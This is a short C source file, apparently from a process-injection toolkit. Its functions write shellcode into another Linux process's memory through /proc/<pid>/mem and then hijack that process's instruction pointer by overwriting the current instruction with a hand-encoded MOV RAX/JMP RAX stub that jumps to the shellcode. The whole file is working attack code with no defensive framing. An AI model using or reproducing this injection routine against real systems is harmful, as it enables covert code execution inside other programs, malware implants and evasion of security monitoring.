#include "procfs_primitives.h"

/*
  Write a payload to a specified process at a given offset using the procfs mem file.
   
  - address: The memory address to write to. Used as the offset in the mem file when writing.
  - pid: The pid of the injected process.
  - payload: A pointer to our shellcode to be copied into the process.
*/
int procfs_proc_mem_write(long address, long pid, const char *payload) 
{
    
    char filepath[256];
    
    // Add the pid to the procfs path
    snprintf(filepath, sizeof(filepath), "/proc/%ld/mem", pid);
    
    // Open the mem file for writing and set the file index to our required offset
    FILE *file = fopen(filepath, "w+");
    fseek(file, address, SEEK_SET);
    
    // Write the payload to the mem file
    fwrite(payload, sizeof(char), strlen(payload), file);
    fclose(file);
    
    return 0;
}

/*
  Gain execution in a remote process by modifying the instruction about to be executed using the procfs mem file.
  The function overwrites the current instruction with a small stub that jumps to a specified memory address.
   
  - address: The memory address to jump to. The address should contain the shellcode to be executed.
  - pid: The pid of the injected process.

*/
int procfs_proc_mem_exec(long address, long pid) 
{
    char filepath[256];
    
    // Get the address of the next instruction to be executed by parsing the procfs syscall file
    long rip_address = procfs_get_rip(pid);

    // Add the pid to the procfs path
    snprintf(filepath, sizeof(filepath), "/proc/%ld/mem", pid);
    
    // Open the mem file for writing and set the file index to our required offset
    FILE *file = fopen(filepath, "w+");
    fseek(file, rip_address, SEEK_SET);
    
    // Overwrite the instruction at the address of RIP with a small stub that jumps to our shellcode
    // MOV RAX, <memory_address>
    // JMP RAX
    fwrite("\x48\xB8", sizeof(char), 2, file); // MOV RAX opcode
    fwrite(((unsigned char *)(&address)), sizeof(char), 6, file); // copy the memory address to jump to
    fwrite("\x00\x00", sizeof(char), 2, file); // pad the address to 64 bit
    fwrite("\xFF\xe0", sizeof(char), 2, file); // JMP RAX opcode

    fclose(file);

    return 0;
}
